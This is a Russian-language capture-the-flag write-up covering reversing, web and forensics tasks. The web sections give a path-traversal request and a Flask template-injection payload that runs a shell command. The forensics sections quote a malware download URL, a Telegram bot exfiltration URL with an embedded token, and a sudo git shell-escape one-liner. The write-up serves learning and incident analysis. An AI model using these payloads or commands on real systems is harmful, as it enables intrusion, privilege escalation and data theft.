# nto_4fun_2024
## REV-1. 
В таске был encrypt ввода, после чего его версия сравнивалась с заданной
 ![Screenshot_2024-03-21_14_07_43](https://github.com/Kreedman05/nto_4fun_2024/assets/164340613/f9103d65-ba78-4d0e-915e-e0956b53be2c)
Для решения таска необходимо было забрутить его значения.
- **Код приложен в файле с названием REV-1**

## Web-1.
1. burp
2. target
3. download запрос на file1.txt
4. hint1: указание что флаг в /etc/secret
5. LFI /download?file_type=../../etc/secret
6. Profit!
![web1 1](https://github.com/Kreedman05/nto_4fun_2024/assets/164340613/68bb735e-ca77-4362-b6ce-46de99d7310d)
![web1 2](https://github.com/Kreedman05/nto_4fun_2024/assets/164340613/b980683b-8f5e-42af-bad5-7112e81a6bf6)


## Web-2
При распаковке сервера были написаны креды:
- AdminPassword = "password";
Попробовав их на сервере, иы получили флаг.

## Web-3
403 error bypass(дополнительный / перед flag)
template injection flask
http://192.168.12.11:8001//flag?name={{self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%22cat%20flag.txt%22).read()}}
![web3](https://github.com/Kreedman05/nto_4fun_2024/assets/164340613/14cc0e39-3750-47b6-b74d-4bb765d1c289)

## Forensic-1
1. Кто-то скачал архив RAR, который содержал в себе PDF-файл, а также CMD-файл, который скачал полезную нагрузку. Архив лежал по пути **C:\Users\Evgeniy\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\CQ2HQVTU\classfied.rar.ransom**. Судя по расположению архива, он был доставлен по почте.
2. Полезная нагрузка была скачана с [http://95.169.192.220:8080/prikol.exe](http://95.169.192.220:8080/prikol.exe).
3. Уязвимость CVE-2023-38831.
4. Для противодействия отладке используются вызовы из WinAPI - CheckRemoteDebuggerPresent() и IsDebuggerPresent(), Если эти вызовы возвращают True (хотя бы один), то вредонос завершает работу.
5. Программа использует алгоритм AES CBC.
6. amogusamogusamogusamogusamogusam.
7. Программа делает POST запрос по URL [https://api.telegram.org/bot7029575943:AAFNYmmW_QqqMcaHZ-DFRn3M05DptExeAGE/sendDocument](https://api.telegram.org/bot7029575943:AAFNYmmW_QqqMcaHZ-DFRn3M05DptExeAGE/sendDocument) и отправляет файл info.txt боту.
8. sFYZ#2z9VdUR9sm`3JRz.

## Forensic-2

1. GitLab 15.2.
2. Тип уязвимости - RCE (в данном случае CVE-2022-2884)
3. Пользователь git был добавлен в файл /etc/sudoers с правом на исполнение бинаря git, который имел SUID бит и мог выполняться от имени root.
4. Злоумышленник повысил свои привелегии через SUID бинарь - git.
   sudo git -p help config !/bin/sh
5. В папке ~/root/.ssh/authorized_keys есть ключ авторизации для amogus@debian
6. **ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIKXFjUp2LlKAsLvM1PZE7CYEfztiZrOf8PHx9ja1mu2 amongus@debian**
7. Злоумышленник просканировал система через linpeas, для повышения привелегий
8. бэкдор LD_PRELOAD через jynx2

